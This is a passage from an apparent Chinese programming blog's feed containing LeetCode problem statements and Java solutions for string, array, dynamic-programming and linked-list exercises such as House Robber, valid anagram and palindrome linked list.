<h3 id="解法四：双端队列"><a href="#解法四：双端队列" class="headerlink" title="解法四：双端队列"></a>解法四：双端队列</h3><h4 id="Java-3"><a href="#Java-3" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">reverseWords</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>, right = s.length() - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// remove leading spaces</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right &amp;&amp; s.charAt(left) == <span class="string">' '</span>) ++left;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// remove trailing spaces</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right &amp;&amp; s.charAt(right) == <span class="string">' '</span>) --right;</span><br><span class="line"></span><br><span class="line">    Deque&lt;String&gt; d = <span class="keyword">new</span> ArrayDeque();</span><br><span class="line">    StringBuilder word = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="comment">// push word by word in front of deque</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">      <span class="keyword">char</span> c = s.charAt(left);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((word.length() != <span class="number">0</span>) &amp;&amp; (c == <span class="string">' '</span>)) &#123;</span><br><span class="line">        d.offerFirst(word.toString());</span><br><span class="line">        word.setLength(<span class="number">0</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c != <span class="string">' '</span>) &#123;</span><br><span class="line">        word.append(c);</span><br><span class="line">      &#125;</span><br><span class="line">      ++left;</span><br><span class="line">    &#125;</span><br><span class="line">    d.offerFirst(word.toString());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> String.join(<span class="string">" "</span>, d);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://leetcode-cn.com/problems/reverse-words-in-a-string/solution/fan-zhuan-zi-fu-chuan-li-de-dan-ci-by-leetcode/" target="_blank" rel="noopener">LeetCode-翻转字符串里面的单词-题解</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>198. 打家劫舍</title>
    <url>/2020/03/27/LeetCode/leetcode-000198-%E6%89%93%E5%AE%B6%E5%8A%AB%E8%88%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，<strong>如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警</strong>。</p>
<p>给定一个代表每个房屋存放金额的非负整数数组，计算你<strong>在不触动警报装置的情况下，</strong>能够偷窃到的最高金额。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,2,3,1]</span><br><span class="line">输出: 4</span><br><span class="line">解释: 偷窃 1 号房屋 (金额 &#x3D; 1) ，然后偷窃 3 号房屋 (金额 &#x3D; 3)。</span><br><span class="line">     偷窃到的最高金额 &#x3D; 1 + 3 &#x3D; 4 。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">2</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">输出: <span class="number">12</span></span><br><span class="line">解释: 偷窃 <span class="number">1</span> 号房屋 (金额 = <span class="number">2</span>), 偷窃 <span class="number">3</span> 号房屋 (金额 = <span class="number">9</span>)，接着偷窃 <span class="number">5</span> 号房屋 (金额 = <span class="number">1</span>)。</span><br><span class="line">     偷窃到的最高金额 = <span class="number">2</span> + <span class="number">9</span> + <span class="number">1</span> = <span class="number">12</span></span><br></pre></td></tr></table></figure>

<h2 id="解法："><a href="#解法：" class="headerlink" title="解法："></a>解法：</h2><h3 id="解法一：动态规划"><a href="#解法一：动态规划" class="headerlink" title="解法一：动态规划"></a>解法一：动态规划</h3><p>根据题意，在第i填获取最大打劫利益，分两种情况：</p>
<ol>
<li>第i天不打劫，第i-1天打劫</li>
<li>第i天打劫，第i-2天打劫</li>
</ol>
<p>那么第i天的最大利益就是f(i) = max(f(n-2) + nums[i], f(n-1))</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rob</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == nums || <span class="number">0</span> == nums.length) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">1</span> == nums.length) &#123;</span><br><span class="line">			<span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">		dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">		dp[<span class="number">1</span>] = Math.max(nums[<span class="number">0</span>], nums[<span class="number">1</span>]);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">			dp[i] = Math.max(dp[i - <span class="number">2</span>] + nums[i], dp[i - <span class="number">1</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> dp[nums.length - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title>209. 长度最小的子数组</title>
    <url>/2020/03/27/LeetCode/leetcode-000209-%E9%95%BF%E5%BA%A6%E6%9C%80%E5%B0%8F%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个含有 <strong>n</strong> 个正整数的数组和一个正整数 <strong>s ，</strong>找出该数组中满足其和 <strong>≥ s</strong> 的长度最小的连续子数组<strong>。</strong>如果不存在符合条件的连续子数组，返回 0。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: s = <span class="number">7</span>, nums = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>]</span><br><span class="line">输出: <span class="number">2</span></span><br><span class="line">解释: 子数组 [<span class="number">4</span>,<span class="number">3</span>] 是该条件下的长度最小的连续子数组。</span><br></pre></td></tr></table></figure>

<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><ul>
<li>如果你已经完成了<em>O</em>(<em>n</em>) 时间复杂度的解法, 请尝试 <em>O</em>(<em>n</em> log <em>n</em>) 时间复杂度的解法。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：双指针"><a href="#解法一：双指针" class="headerlink" title="解法一：双指针"></a>解法一：双指针</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minSubArrayLen</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> minLength = nums.length + <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> begin = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">			sum += nums[i];</span><br><span class="line">			<span class="keyword">while</span> (sum &gt;= s) &#123;</span><br><span class="line">				minLength = Math.min(minLength, i - begin + <span class="number">1</span>);</span><br><span class="line">				sum -= nums[begin++];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> minLength == nums.length + <span class="number">1</span> ? <span class="number">0</span> : minLength;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>234. 回文链表</title>
    <url>/2020/03/27/LeetCode/leetcode-000234-%E5%9B%9E%E6%96%87%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>请判断一个链表是否为回文链表。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="number">1</span>-&gt;<span class="number">2</span></span><br><span class="line">输出: <span class="keyword">false</span></span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="number">1</span>-&gt;<span class="number">2</span>-&gt;<span class="number">2</span>-&gt;<span class="number">1</span></span><br><span class="line">输出: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>

<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p>你能否用 O(n) 时间复杂度和 O(1) 空间复杂度解决此题？</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：借助数组"><a href="#解法一：借助数组" class="headerlink" title="解法一：借助数组"></a>解法一：借助数组</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">		ArrayList&lt;Integer&gt; nums = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		<span class="keyword">while</span> (head != <span class="keyword">null</span>) &#123;</span><br><span class="line">			nums.add(head.val);</span><br><span class="line">			head = head.next;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> begin = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> end = nums.size() - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span> (begin &lt; end) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nums.get(begin).intValue() != nums.get(end).intValue()) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			begin++;</span><br><span class="line">			end--;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里要注意一个点，之前第11行的比较语句是nums.get(begin) != nums.get(end)，在跑以下测试用例的时候是没有问题的。</p>
<p>[1,2]<br>[1,2,1]<br>[1,2,2,1]</p>
<p>但是碰到用例[-129,-129]就出现解答错误。然后才想起来，JVM对整型数据有优化，[-128,128]范围内的数字是共享的，所以一旦数字超过范围nums.get(begin) != nums.get(end) 就不会再相等了。</p>
<p>这才把比较语句改为nums.get(begin).intValue() != nums.get(end).intValue()</p>
<h3 id="解法二：借助栈和快慢指针"><a href="#解法二：借助栈和快慢指针" class="headerlink" title="解法二：借助栈和快慢指针"></a>解法二：借助栈和快慢指针</h3><h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> boolean <span class="title">isPalindrome</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        ListNode fast = head, slow = head;</span><br><span class="line">        Stack&lt;ListNode&gt; <span class="built_in">stack</span> = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span>(fast != null &amp;&amp; fast.next != null)&#123;</span><br><span class="line">            <span class="built_in">stack</span>.push(slow);</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(fast != null)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(slow != null)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">stack</span>.pop().val != slow.val) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：快慢指针和翻转链表"><a href="#解法三：快慢指针和翻转链表" class="headerlink" title="解法三：快慢指针和翻转链表"></a>解法三：快慢指针和翻转链表</h3><h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="keyword">null</span>)<span class="keyword">return</span> <span class="keyword">true</span>;<span class="comment">//处理输入为空的情况，返回true</span></span><br><span class="line">        ListNode slow = findMid(head);</span><br><span class="line">        <span class="keyword">if</span>(head==slow)&#123;<span class="comment">//处理只有一个或两个节点的情况</span></span><br><span class="line">            <span class="keyword">if</span>(head.next==<span class="keyword">null</span>||head.val==head.next.val)<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        reverse(slow);<span class="comment">//反转链表的后半部分</span></span><br><span class="line">        <span class="keyword">boolean</span> result = compare(head,slow.next);</span><br><span class="line">        reverse(slow);<span class="comment">//恢复链表原本的结构</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">findMid</span><span class="params">(ListNode head)</span></span>&#123;</span><br><span class="line">        ListNode slow = head;</span><br><span class="line">        ListNode fast = head;</span><br><span class="line">        <span class="keyword">while</span>(fast.next!=<span class="keyword">null</span>&amp;&amp;fast.next.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            slow=slow.next;</span><br><span class="line">            fast=fast.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(ListNode slow)</span></span>&#123; <span class="comment">//链表就地反转 参考：https://www.cnblogs.com/mwl523/p/10749144.html</span></span><br><span class="line">        ListNode pre = slow.next;</span><br><span class="line">        ListNode pCur = pre.next;</span><br><span class="line">        <span class="keyword">while</span>(pCur!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            pre.next=pCur.next;</span><br><span class="line">            pCur.next=slow.next;</span><br><span class="line">            slow.next=pCur;</span><br><span class="line">            pCur=pre.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">compare</span><span class="params">(ListNode one,ListNode two)</span></span>&#123;<span class="comment">//比较两部分链表是否相同</span></span><br><span class="line">        <span class="keyword">while</span>(one!=<span class="keyword">null</span>&amp;&amp;two!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(one.val!=two.val)<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            one=one.next;</span><br><span class="line">            two=two.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
        <tag>回文</tag>
      </tags>
  </entry>
  <entry>
    <title>242. 有效的字母异位词</title>
    <url>/2020/03/27/LeetCode/leetcode-000242-%E6%9C%89%E6%95%88%E7%9A%84%E5%AD%97%E6%AF%8D%E5%BC%82%E4%BD%8D%E8%AF%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个字符串 <em>s</em> 和 <em>t</em> ，编写一个函数来判断 <em>t</em> 是否是 <em>s</em> 的字母异位词。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: s = <span class="string">"anagram"</span>, t = <span class="string">"nagaram"</span></span><br><span class="line">输出: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: s = <span class="string">"rat"</span>, t = <span class="string">"car"</span></span><br><span class="line">输出: <span class="keyword">false</span></span><br></pre></td></tr></table></figure>

<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>你可以假设字符串只包含小写字母。</p>
<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p>如果输入字符串包含 unicode 字符怎么办？你能否调整你的解法来应对这种情况？</p>
<p><strong>如果输入包含unicode字符的话，使用哈希表。如果使用数组的话，unicode范围过大，浪费空间</strong></p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：哈希表"><a href="#解法一：哈希表" class="headerlink" title="解法一：哈希表"></a>解法一：哈希表</h3><p>借助哈希表，把s里面的每个字符，以及次数都保存在哈希表里面。遍历t，如果发现t中的字符c不在哈希表中， 则返回false，否则，字符c的次数减一。</p>
<p>如果字符c的次数减一完之后已经为0了，从哈希表中移除字符c。</p>
<h4 id="Java-哈希表"><a href="#Java-哈希表" class="headerlink" title="Java-哈希表"></a>Java-哈希表</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> boolean <span class="title">isAnagram</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (null == s || null == t) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (s.length() != t.length()) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		Map&lt;Character, Integer&gt; <span class="built_in">map</span> = <span class="keyword">new</span> HashMap&lt;Character, Integer&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">char</span> c : s.toCharArray()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">map</span>.containsKey(c)) &#123;</span><br><span class="line">				<span class="built_in">map</span>.put(c, <span class="built_in">map</span>.get(c) + <span class="number">1</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="built_in">map</span>.put(c, <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">char</span> c : t.toCharArray()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="built_in">map</span>.containsKey(c)) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">map</span>.get(c) == <span class="number">1</span>) &#123;</span><br><span class="line">					<span class="built_in">map</span>.remove(c);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="built_in">map</span>.put(c, <span class="built_in">map</span>.get(c) - <span class="number">1</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p>使用数组</p>
<p>声明一个26长度的数组，遍历s，对s中的每个c，对数组索引为c的位置自增。</p>
<p>遍历t，对t中的每个字符c，如果数组中对应位置的计数为0，返回false，否则自减一</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isAnagram</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length() != t.length()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span>[] table = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">26</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">        table[s.charAt(i) - <span class="string">'a'</span>]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t.length(); i++) &#123;</span><br><span class="line">        table[t.charAt(i) - <span class="string">'a'</span>]--;</span><br><span class="line">        <span class="keyword">if</span> (table[t.charAt(i) - <span class="string">'a'</span>] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="解法三：排序"><a href="#解法三：排序" class="headerlink" title="解法三：排序"></a>解法三：排序</h3><p>将字符串s和t转为字符数组，排序，挨个字符挨个字符比较</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isAnagram</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == s || <span class="keyword">null</span> == t) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (s.length() != t.length()) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">char</span>[] cs = s.toCharArray();</span><br><span class="line">        <span class="keyword">char</span>[] ct = t.toCharArray();</span><br><span class="line">        Arrays.sort(cs);</span><br><span class="line">        Arrays.sort(ct);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; cs.length;i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (cs[i] != ct[i]) &#123;</span><br><span class="line">        		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>344. 反转字符串</title>
    <url>/2020/03/27/LeetCode/leetcode-000344.%20%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组 char[] 的形式给出。</p>
<p>不要给另外的数组分配额外的空间，你必须原地修改输入数组、使用 O(1) 的额外空间解决这一问题。</p>
<p>你可以假设数组中的所有字符都是 ASCII 码表中的可打印字符。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;h&quot;,&quot;e&quot;,&quot;l&quot;,&quot;l&quot;,&quot;o&quot;]</span><br><span class="line">输出：[&quot;o&quot;,&quot;l&quot;,&quot;l&quot;,&quot;e&quot;,&quot;h&quot;]</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;H&quot;,&quot;a&quot;,&quot;n&quot;,&quot;n&quot;,&quot;a&quot;,&quot;h&quot;]</span><br><span class="line">输出：[&quot;h&quot;,&quot;a&quot;,&quot;n&quot;,&quot;n&quot;,&quot;a&quot;,&quot;H&quot;]</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>双指针，begin指向数组头，end指向数组尾。交换，直到begin &gt; end为止。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverseString</span><span class="params">(<span class="keyword">char</span>[] s)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> begin = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> end = s.length - <span class="number">1</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">while</span> (begin &lt; end) &#123;</span><br><span class="line">			<span class="keyword">char</span> c = s[begin];</span><br><span class="line">			s[begin] = s[end];</span><br><span class="line">			s[end] = c;</span><br><span class="line">			begin++;</span><br><span class="line">			end--;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>387. 字符串中的第一个唯一字符</title>
    <url>/2020/03/27/LeetCode/leetcode-000387-%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%94%AF%E4%B8%80%E5%AD%97%E7%AC%A6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个字符串，找到它的第一个不重复的字符，并返回它的索引。如果不存在，则返回 -1。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">s = <span class="string">"leetcode"</span></span><br><span class="line">返回 <span class="number">0</span>.</span><br><span class="line"></span><br><span class="line">s = <span class="string">"loveleetcode"</span>,</span><br><span class="line">返回 <span class="number">2</span>.</span><br></pre></td></tr></table></figure>

<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>您可以假定该字符串只包含小写字母。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>采用数组或者哈希表判断第一个唯一字符。</p>
<p>第一次遍历，用数组或者哈希表保存每个字符出现的次数；</p>
<p>第二次遍历，判断数组中每个字符的次数是否为1，1的话就是第一个出现的唯一字符，否则，继续遍历。</p>
<h4 id="Java-数组"><a href="#Java-数组" class="headerlink" title="Java-数组"></a>Java-数组</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">firstUniqChar</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] chars = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">26</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++) &#123;</span><br><span class="line">        	chars[(s.charAt(i) - <span class="string">'a'</span>)]++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length();i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (chars[s.charAt(i) - <span class="string">'a'</span>] == 